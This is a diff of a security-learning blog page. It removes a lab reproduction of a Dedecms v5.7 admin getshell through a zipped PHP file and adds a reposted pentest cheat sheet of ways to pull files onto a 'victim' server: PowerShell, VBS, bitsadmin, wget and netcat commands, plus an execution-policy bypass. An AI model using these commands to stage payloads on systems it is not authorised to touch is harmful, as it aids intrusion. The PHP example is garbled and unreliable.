@@ -6,32 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
-  <title>渗透学习 — Dedecms v5.7漏洞复现合集 | Knlvre</title>
+  <title>渗透学习 — 十三种方式下载文件 | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言参考大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 [ox01]前台任意用户密码修改[ox02]后台getshell先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  网站环境初始化，进入到这个本地网站环境： 1http://127.0.0.1/DedeC">
+  <meta name="description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&amp;quot;http://domain/file&amp;quot;,&amp;quot;C:%homepath%">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透学习 — Dedecms v5.7漏洞复现合集">
-<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/index.html">
+<meta property="og:title" content="渗透学习 — 十三种方式下载文件">
+<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/10/04/十三种方式下载文件/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="前言参考大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 [ox01]前台任意用户密码修改[ox02]后台getshell先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  网站环境初始化，进入到这个本地网站环境： 1http://127.0.0.1/DedeC">
+<meta property="og:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&amp;quot;http://domain/file&amp;quot;,&amp;quot;C:%homepath%">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png">
-<meta property="og:updated_time" content="2019-09-04T02:18:41.716Z">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png">
+<meta property="og:updated_time" content="2019-10-03T17:44:16.373Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="渗透学习 — Dedecms v5.7漏洞复现合集">
-<meta name="twitter:description" content="前言参考大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 [ox01]前台任意用户密码修改[ox02]后台getshell先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  网站环境初始化，进入到这个本地网站环境： 1http://127.0.0.1/DedeC">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png">
+<meta name="twitter:title" content="渗透学习 — 十三种方式下载文件">
+<meta name="twitter:description" content="本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： 1234$p = New-Object System.Net.WebClient$p.DownloadFile(&amp;quot;http://domain/file&amp;quot;,&amp;quot;C:%homepath%">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -149,63 +139,103 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-渗透学习 — Dedecms v5.7漏洞复现合集" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-十三种方式下载文件" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      渗透学习 — Dedecms v5.7漏洞复现合集
+      渗透学习 — 十三种方式下载文件
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/" class="archive-article-date">
-  	<time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-28</time>
+        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">Dedecms v5.7 sp2</a></p>
-<h1 id="ox01-前台任意用户密码修改"><a href="#ox01-前台任意用户密码修改" class="headerlink" title="[ox01]前台任意用户密码修改"></a>[ox01]前台任意用户密码修改</h1><h1 id="ox02-后台getshell"><a href="#ox02-后台getshell" class="headerlink" title="[ox02]后台getshell"></a>[ox02]后台getshell</h1><p>先创建一个文件<strong>1.jpg.php</strong>，其中内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>将这个文件压缩成<strong>ZIP</strong>格式的压缩文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png" alt="1-1"></p>
-<p>网站环境初始化，进入到这个本地网站环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2</span><br></pre></td></tr></table></figure>
-<p>点击<strong>uploads</strong>，按照提示的步骤对网站初始化</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png" alt="2-1"></p>
-<p>进入到后台：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/</span><br></pre></td></tr></table></figure>
-<p>默认登录的用户名和密码都是<strong>admin</strong></p>
-<p>进入 <strong>附件管理 — 文件式管理器</strong> 的 <strong>soft</strong> 文件夹中</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png" alt="3-1"></p>
-<p>点击 <strong>文件上传</strong> 把刚才创建的 <strong>1.zip</strong> 压缩文件上传上去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png" alt="3-2"></p>
-<p>发布刚才上传的文档</p>
-<p>访问这个地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php</span><br></pre></td></tr></table></figure>
-<p>看到的是 <strong>发布新图集</strong> 的界面</p>
-<p>先点击右上角的 <strong>栏目管理 — 增加顶级栏目</strong> 创建一个栏目，这样下一步操作才能继续</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png" alt="4-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png" alt="4-2"></p>
-<p>然后简单填写一下图中那2栏必填的就可以点击确定了</p>
-<p>注意：<strong>内容模型</strong> 这一栏要选择 <strong>图片集</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png" alt="4-3"></p>
-<p>再次返回刚才 <strong>发布新图集</strong> 的界面，填写一下图中那几栏的信息</p>
-<p>勾选 <strong>从ZIP压缩包中提取文件</strong> 点击 <strong>浏览</strong> 选择刚才我们上传的 <strong>1.zip</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png" alt="4-4"></p>
-<p>当提示 <strong>成功发布一个图集</strong> 时，点击 <strong>浏览文档</strong> </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png" alt="5-1"></p>
-<p>点击这个标签，就可以看到结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png" alt="5-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png" alt="5-3"></p>
-<hr>
-<p>参考文章：</p>
-<p><a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">https://xz.aliyun.com/t/4150</a></p>
+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)</span><br><span class="line"></span><br><span class="line">如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;)</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell set-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = &quot;http://domain/file&quot;</span><br><span class="line">dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .type = 1 &apos;</span><br><span class="line">    .open</span><br><span class="line">    .write xHttp.responseBody</span><br><span class="line">    .savetofile &quot; C:\%homepath%\file&quot;, 2 &apos;</span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl </span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# perl test.pl</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(&apos;http://domain/file&apos;) </span><br><span class="line">localFile = open(&apos;local_file&apos;, &apos;w&apos;) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# python test.py</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;net/http&apos;</span><br><span class="line">Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|</span><br><span class="line">r = http.get(&quot;/file&quot;)</span><br><span class="line">open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ruby test.rb</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/php </span><br><span class="line">&quot;http://example.com/file&quot;);</span><br><span class="line">$lf = &quot;local_file&quot;;         </span><br><span class="line">$fh = fopen($lf, &apos;w&apos;);         </span><br><span class="line">fwrite($fh, $data[0]);         </span><br><span class="line">fclose($fh); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# php test.php</span><br></pre></td></tr></table></figure>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file exit</span><br></pre></td></tr></table></figure>
+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p>target执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>传送端，发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>接收端，连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<p>发送端，压缩并发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
 
       
 
@@ -275,7 +305,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/02/28/渗透学习 — Dedecms v5.7漏洞复现合集/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/10/04/十三种方式下载文件/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -289,18 +319,9 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/03/04/BugKuCTF—杂项题 第11-20关/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          BugKuCTF — 杂项题(第11-20关)
-        
-      </div>
-    </a>
   
-  
-    <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">BugKuCTF — 利用Kali分离图片中的隐藏文件</div>
+    <a href="/Knlvre.github-io/2019/09/26/CVE-2018-15877 复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">渗透学习 — CVE-2018-15877 复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
